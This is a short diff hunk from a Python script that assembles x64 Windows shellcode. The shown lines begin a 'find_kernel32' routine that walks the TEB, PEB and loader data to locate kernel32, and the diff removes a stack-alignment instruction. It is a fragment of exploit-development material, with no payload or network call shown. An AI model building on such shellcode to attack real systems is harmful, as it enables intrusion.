@@ -211,7 +211,6 @@ if __name__ == "__main__":
 
 	CODE = (
 "find_kernel32:"
-" and rsp, 0xFFFFFFFFFFFFFFF0;"    # Stack alignment
 " xor rdx, rdx;"
 " mov rax, gs:[rdx+0x60];"        # RAX stores the value of ProcessEnvironmentBlock member in TEB, which is the PEB address
 " mov rsi,[rax+0x18];"        # Get the value of the LDR member in PEB, which is the address of the _PEB_LDR_DATA structure
